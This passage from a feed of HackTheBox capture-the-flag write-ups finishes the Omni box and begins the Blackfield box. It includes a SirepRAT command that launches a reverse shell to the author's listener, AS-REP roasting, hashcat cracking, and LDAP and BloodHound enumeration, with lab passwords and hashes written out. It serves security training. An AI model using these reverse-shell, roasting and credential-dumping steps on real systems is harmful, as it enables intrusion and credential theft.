000000D0: <span style="color:#ae81ff">34</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> 2D <span style="color:#ae81ff">00</span> 6F <span style="color:#ae81ff">00</span>  4...e.x.e. .-.o.
000000E0: <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">00</span>  6C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">00</span>  u.t.f.i.l.e. .U.
000000F0: 3A <span style="color:#ae81ff">00</span> 5C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">73</span> <span style="color:#ae81ff">00</span> 5C <span style="color:#ae81ff">00</span>  :.<span style="color:#ae81ff">\.</span>U.s.e.r.s.<span style="color:#ae81ff">\.</span>
00000100: <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">00</span> 6C <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> 5C <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">00</span>  p.u.b.l.i.c.<span style="color:#ae81ff">\.</span>x.
00000110: <span style="color:#ae81ff">63</span> <span style="color:#ae81ff">00</span> 2E <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">00</span>                    c...e.x.e.
RECV:
00000000: <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>                                       ....
&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;
</code></pre></div><p>After that, I&rsquo;ll setup a listener, and send a reverse shell to my listener from Omni.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «omni» «10.10.14.47»
$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd <span style="color:#e6db74">&#34;C:\Windows\System32\cmd.exe&#34;</span> --args <span style="color:#e6db74">&#34;/c U:\Users\public\xc.exe -e cmd.exe 10.10.14.47 1337
</span><span style="color:#e6db74">&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0
</span></code></pre></div><p>And I have interactive shell now.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#960050;background-color:#1e0010">→</span> root@iamf <span style="color:#960050;background-color:#1e0010">«</span>omni<span style="color:#960050;background-color:#1e0010">»</span> <span style="color:#960050;background-color:#1e0010">«</span>10.10.14.47<span style="color:#960050;background-color:#1e0010">»</span>
$ rlwrap nc -nvlp 1337
listening on <span style="color:#66d9ef">[any]</span> 1337 ...
connect to [10.10.14.47] from (UNKNOWN) [10.10.10.204] 49689
Microsoft Windows <span style="color:#66d9ef">[Version 10.0.17763.107]</span>
Copyright (c) Microsoft Corporation. All rights reserved.

PS C:\windows\system32&gt;$env:username
Omni$
</code></pre></div><h3 id="internal-enumeration">Internal Enumeration</h3>
<p>Enumerating for the flags finds they are located at <code>C:\Data\Users\administrator\root.txt</code> and <code>C:\Data\Users\app\user.txt</code>. Since I have access as the SYSTEM itself, I can read both the user flag and the root flag directly, but the flags are encrypted.</p>
<p><code>root.txt</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">PS C:\&gt; type C:\Data\Users\administrator\root.txt
type root.txt
<span style="color:#f92672">&lt;Objs</span> <span style="color:#a6e22e">Version=</span><span style="color:#e6db74">&#34;1.1.0.1&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;Obj</span> <span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;TN</span> <span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
      <span style="color:#f92672">&lt;T&gt;</span>System.Management.Automation.PSCredential<span style="color:#f92672">&lt;/T&gt;</span>
      <span style="color:#f92672">&lt;T&gt;</span>System.Object<span style="color:#f92672">&lt;/T&gt;</span>
    <span style="color:#f92672">&lt;/TN&gt;</span>
    <span style="color:#f92672">&lt;ToString&gt;</span>System.Management.Automation.PSCredential<span style="color:#f92672">&lt;/ToString&gt;</span>
    <span style="color:#f92672">&lt;Props&gt;</span>
      <span style="color:#f92672">&lt;S</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;UserName&#34;</span><span style="color:#f92672">&gt;</span>flag<span style="color:#f92672">&lt;/S&gt;</span>
      <span style="color:#f92672">&lt;SS</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;Password&#34;</span><span style="color:#f92672">&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7<span style="color:#f92672">&lt;/SS&gt;</span>
    <span style="color:#f92672">&lt;/Props&gt;</span>
  <span style="color:#f92672">&lt;/Obj&gt;</span>
<span style="color:#f92672">&lt;/Objs&gt;</span>
</code></pre></div><p><code>user.txt</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">PS C:\&gt; type C:\Data\Users\app\user.txt
type C:\Data\Users\app\user.txt
<span style="color:#f92672">&lt;Objs</span> <span style="color:#a6e22e">Version=</span><span style="color:#e6db74">&#34;1.1.0.1&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span style="color:#f92672">&gt;</span>
  <span style="color:#f92672">&lt;Obj</span> <span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
    <span style="color:#f92672">&lt;TN</span> <span style="color:#a6e22e">RefId=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">&gt;</span>
      <span style="color:#f92672">&lt;T&gt;</span>System.Management.Automation.PSCredent^M^M      <span style="color:#f92672">&lt;T&gt;</span>System.Management.Automation.PSCredent^M^M      <span style="color:#f92672">&lt;T&gt;</span>System.Management.Automation.PSCredential<span style="color:#f92672">&lt;/T&gt;</span>
      <span style="color:#f92672">&lt;T&gt;</span>System.Object<span style="color:#f92672">&lt;/T&gt;</span>
    <span style="color:#f92672">&lt;/TN&gt;</span>
    <span style="color:#f92672">&lt;ToString&gt;</span>System.Management.Automation.PSCredential<span style="color:#f92672">&lt;/ToString&gt;</span>
    <span style="color:#f92672">&lt;Props&gt;</span>
      <span style="color:#f92672">&lt;S</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;UserName&#34;</span><span style="color:#f92672">&gt;</span>flag<span style="color:#f92672">&lt;/S&gt;</span>
      <span style="color:#f92672">&lt;SS</span> <span style="color:#a6e22e">N=</span><span style="color:#e6db74">&#34;Password&#34;</span><span style="color:#f92672">&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7<span style="color:#f92672">&lt;/SS&gt;</span>
    <span style="color:#f92672">&lt;/Props&gt;</span>
  <span style="color:#f92672">&lt;/Obj&gt;</span>
<span style="color:#f92672">&lt;/Objs&gt;</span>
</code></pre></div><p><a href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx">This article</a> shows way to decrypt those two files.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$credential = Import-CliXml -Path  &lt;PathToXml&gt;\MyCredential.xml
$credential.GetNetworkCredential().Password
</code></pre></div><p>But then, I get an &ldquo;<em>Error occurred during a cryptographic operation</em>&rdquo; message. After <em>Googling</em> around to find the answer why it doesn’t work, it turns out the flag can only be decrypted by the user itself. So if I want to decrypt <code>user.txt</code>, I have to get access as <code>app</code> user.</p>
<p>While enumerating files recursively using the <code>dir</code> command, I spotted a batch file placed in the PowerShell folder.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\&gt;cmd /c &#34;dir /s /b *.bat&#34;
cmd /c &#34;dir /s /b *.bat&#34;
C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat
C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\Build.bat
C:\Program Files\WindowsPowerShell\Modules\Pester\3.4.0\bin\Pester.bat
</code></pre></div><p>The batch files contains the credentials for user <code>app</code> and <code>administrator</code>. The file itself looks like automation script to revert the user and admin account to default.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\&gt; gc &#34;C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat&#34;
gc &#34;C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat&#34;
@echo off

:LOOP

for /F &#34;skip=6&#34; %%i in (&#39;net localgroup &#34;administrators&#34;&#39;) do net localgroup &#34;administrators&#34; %%i /delete

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

ping -n 3 127.0.0.1

cls

GOTO :LOOP

:EXIT
</code></pre></div><h3 id="decrypting-the-flags">Decrypting the Flags</h3>
<p>Both credentials are works on the Windows Device Portal (WDP) web. WDP has a feature that allows you to do command execution on the system, so I can decrypt each flag from there.</p>
<p>For the root flag, I&rsquo;ll use the administrator account (<code>administrator:_1nt3rn37ofTh1nGz</code>) and issue the command below.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell.exe -c <span style="color:#e6db74">&#34;$credential=Import-CliXml -Path U:\Users\Administrator\root.txt ;$credential.GetNetworkCredential().Password;&#34;</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210507020847618.png" alt="image-20210507020847618"  />
</p>
<p>For the user flag, the procedure goes the same.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://nmap.org/nsedoc/scripts/http-auth.html">https://nmap.org/nsedoc/scripts/http-auth.html</a></li>
<li><a href="https://github.com/SafeBreach-Labs/SirepRAT">https://github.com/SafeBreach-Labs/SirepRAT</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Blackfield</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/</link>
      <pubDate>Tue, 04 May 2021 14:28:21 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/</guid>
      <description>Abusing DiskShadow utility to dump Active Directory database</description>
      <content:encoded><![CDATA[<p>Blackfield is a hard difficulty Windows machine  from HackTheBox that features Active Directory environment. It begins with collecting a list of usernames from an SMB share. With these usernames, I&rsquo;m able to perform AS-REP roasting attack and obtain a TGT from a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds an LSASS memory dump file. The dump file contains an NT hash of a service account that is a member of Backup Operators. The privileges of the Backup Operators group can be abused to create a volume shadow copy and pull the <code>NTDS.dit</code> file from there. With the <code>NTDS.dit</code> file, I&rsquo;m able to retrieves the NT hash of the administrator account, and then perform pass-the-hash attack to gain administrator access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>AS-REP roasting</li>
<li>LDAP enumeration</li>
<li>BloodHound</li>
<li>Abusing Windows Access Tokens - SeBackupPrivilege</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>smbclient - Preinstalled in Kali Linux</li>
<li>SMBMap - Preinstalled in Kali Linux</li>
<li>ldapdomaindump - <a href="https://github.com/dirkjanm/ldapdomaindump">https://github.com/dirkjanm/ldapdomaindump</a></li>
<li>CrackMapExec - <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></li>
<li>BloodHound - <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
<li>BloodHound.py - <a href="https://github.com/fox-it/BloodHound.py">https://github.com/fox-it/BloodHound.py</a></li>
<li>SeBackupPrivilege CmdLets - <a href="https://github.com/giuliano108/SeBackupPrivilege">https://github.com/giuliano108/SeBackupPrivilege</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ nmap -sC -sV -oN initial-blackfield 10.10.10.192
Nmap scan report <span style="color:#66d9ef">for</span> blackfield.htb <span style="color:#f92672">(</span>10.10.10.192<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.054s latency<span style="color:#f92672">)</span>.

PORT STATE SERVICE VERSION
53/tcp open domain?
| fingerprint-strings: 
| DNSVersionBindReqTCP: 
| version
|_ bind
88/tcp open kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020–10–04 10:53:38Z<span style="color:#f92672">)</span>
135/tcp open msrpc Microsoft Windows RPC
389/tcp open ldap Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
445/tcp open microsoft-ds?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
3268/tcp open ldap Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/3%Time<span style="color:#f92672">=</span>5F794746%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>DNSV
SF:ersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
</span><span style="color:#e6db74">SF:x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode: 
| 2.02: 
|_ Message signing enabled and required
| smb2-time: 
| date: 2020–10–04T10:55:58
|_ start_date: N/A
</code></pre></div><p>An initial TCP scan with <code>nmap</code> discovered at least seven open ports. These ports are the typical port used by Active Directory Domain Controller (AD DC).</p>
<p>I&rsquo;ll summarize the result:</p>
<ul>
<li>There is a DNS service on port 53, but HTB box is a single machine, so enumerating this service is not priority.</li>
<li>There is a Kerberos service on port 88 is running Kerberos. I can try AS-REP roasting here.</li>
<li>There is MS-RPC service on port 135, which I don&rsquo;t touch it really often, so I&rsquo;ll lower the priority.</li>
<li>There is an LDAP service on port 389, LDAP is the standard protocol for directory services. Active Directory is Microsoft&rsquo;s implementation of directory services and it supports LDAP query.</li>
<li>There is an SMB service on port 445. I can try anonymous login here.</li>
<li>Port 3268 is running LDAP as well, but it&rsquo;s used as <a href="https://social.technet.microsoft.com/Forums/Lync/en-US/e52b9154-b93a-4a3b-b6f2-0285f932da14/389-and-3268-port-difference?forum=winserverDS">global catalog</a> (read more: <a href="https://www.techopedia.com/definition/25429/global-catalog-gc">here</a>).</li>
</ul>
<p><code>nmap</code> also identified the AD domain name is <code>blackfield.local</code>.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>On LDAP, I can send a query to obtain the domain metadata, but first I&rsquo;ll look into the rootDSE<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> to retrieve a list of the domain naming context.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ ldapsearch -LLL -x -h 10.10.10.192 -s base namingContexts
dn:
namingcontexts: DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
namingcontexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
namingcontexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
namingcontexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
namingcontexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
</code></pre></div><ul>
<li>
<p><code>-LLL</code>: removes every comments in the output</p>
</li>
<li>
<p><code>-x</code>: to perform simple authentication</p>
</li>
<li>
<p><code>-h</code>: hostname or IP</p>
</li>
<li>
<p><code>-s</code>: search scope, base will returns the contents of the root DSE</p>
</li>
</ul>
<p>I can use <code>DC=BLACKFIELD,DC=local</code> (this is called as <em>distinguished name</em>), but unfortunately the anonymous bind is not allowed.</p>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Trying anonymous login with <code>crackmapexec</code> returns a status access denied.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ crackmapexec smb 10.10.10.192 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:BLACKFIELD.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> BLACKFIELD.local<span style="color:#ae81ff">\:</span> STATUS_ACCESS_DENIED
SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
</code></pre></div><p>But on using <code>smbclient</code>, it return the shares list.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ smbclient -N -L //10.10.10.192/

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        profiles$       Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
do_connect: Connection <span style="color:#66d9ef">for</span> 10.10.10.192 failed <span style="color:#f92672">(</span>Error NT_STATUS_IO_TIMEOUT<span style="color:#f92672">)</span>
Unable to connect with SMB1 -- no workgroup available
</code></pre></div><p>Later, I came to know that ‘anonymous’ must be specified in <code>crackmapexec</code>.</p>
<p><img class="img-container" src="imgs/image-20210504155151284.png" alt="image-20210504155151284"  />
</p>
<h4 id="profiles-share">profiles$ share</h4>
<p>I have read permission on the <code>profile$</code> share. The share contains a bunch of empty users folder.</p>
<p><img class="img-container" src="imgs/image-20210504155638689.png" alt="image-20210504155638689"  />
</p>
<p>I can convert these folders name to list of username using <code>awk '{print $1}'</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ cat folder.list | awk <span style="color:#e6db74">&#39;{print $1}&#39;</span> | tee users.list
AAlleni
ABarteski
ABekesz
ABenzies
ABiemiller
AChampken
...&lt;SNIP&gt;...
</code></pre></div><p>Now that I have a list of usernames, I can try AS-REP roast attack.</p>
<h3 id="tcp-88---kerberos">TCP 88 - Kerberos</h3>
<h4 id="as-rep-roasting">AS-REP roasting</h4>
<p>I&rsquo;ll use <code>GetNPUsers.py</code> to perform AS-REP roasting on Kerberos.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ GetNPUsers.py BLACKFIELD.LOCAL/ -no-pass -usersfile users.list -dc-ip 10.10.10.192 -outputfile TGT_AS-REP
</code></pre></div><p>And watching the output file using watch command</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ watch -n <span style="color:#ae81ff">1</span> cat TGT_AS-REP
</code></pre></div><p>After a few minutes, it shows the hash for user <code>support</code>.</p>
<p><img class="img-container" src="imgs/image-20210504160338371.png" alt="image-20210504160338371"  />
</p>
<p>I&rsquo;ll send the hash to my Windows for cracking.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ cat TGT_AS-REP
$krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805
</code></pre></div><h3 id="cracking-the-hash">Cracking the Hash</h3>
<p>I&rsquo;ll use dictionary attack to recover the user password using <code>hashcat</code>, and it cracks within a few seconds.</p>
<pre><code>C:\tools\hashcat6&gt; hashcat -m 18200 hashes/blackfield.hash rockyou.txt -O
hashcat (v6.1.1) starting...

...&lt;SNIP&gt;...
$krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805:#00^BlackKnight

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e...3ab805
...&lt;SNIP&gt;...
</code></pre><p>The password for user <code>support</code> is <code>#00^BlackKnight</code>.</p>
<h3 id="access-as-support">Access as support</h3>
<p>Now that I obtained a set of credentials, I can re-enumerate the available services.</p>
<h4 id="ldap-domain-dump">LDAP Domain Dump</h4>
<p>The credentials works on LDAP, I can use it to obtain the domain info using <a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
$ ldapdomaindump -u <span style="color:#e6db74">&#39;BLACKFIELD.LOCAL\support&#39;</span> -p <span style="color:#e6db74">&#39;#00^BlackKnight&#39;</span> -no-json -no-grep 10.10.10.192
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to host...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Binding to host
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting domain dump
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain dump finished
</code></pre></div><p>The output from the tool are formatted in HTML document, and I get the following information:</p>
<p>The OS information and the computer FQDN.</p>
<p><img class="img-container" src="imgs/image-20210504162822528.png" alt="image-20210504162822528"  />
</p>
<p>The domain policy.</p>
<p><img class="img-container" src="imgs/image-20210504162931229.png" alt="image-20210504162931229"  />
</p>
<p>The interesting domain users.</p>
<p><img class="img-container" src="imgs/image-20210504163338913.png" alt="image-20210504163338913"  />
</p>
<p><img class="img-container" src="imgs/image-20210504163255290.png" alt="image-20210504163255290"  />
</p>
<p>Interesting groups</p>
<p><img class="img-container" src="imgs/image-20210504163741235.png" alt="image-20210504163741235"  />
</p>
<p><img class="img-container" src="imgs/image-20210504163658173.png" alt="image-20210504163658173"  />
</p>
<p><img class="img-container" src="imgs/image-20210504163716719.png" alt="image-20210504163716719"  />
</p>
<p>From here, I know that user <code>support</code> does not have remote shell access like WinRM.</p>
<h4 id="bloodhound">BloodHound</h4>
<p>There is a python-based ingestor for <code>BloodHound</code> besides <code>SharpHound</code>. It can be used remotely from Linux.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
$ python bloodhound.py -c All -u <span style="color:#e6db74">&#39;support@blackfield.local&#39;</span> -p <span style="color:#e6db74">&#39;#00^BlackKnight&#39;</span> -d blackfield.local -dc DC01.BLACKFIELD.local -ns 10.10.10.192
</code></pre></div><ul>
<li><code>-c</code>: collect method : all</li>
<li><code>-u</code>,<code>-p</code>: credentials set</li>
<li><code>-d</code>: domain name</li>
<li><code>-dc</code>: FQDN of domain controller (it’s on ldap domain dump section → <strong>domain_computers.html</strong>)</li>
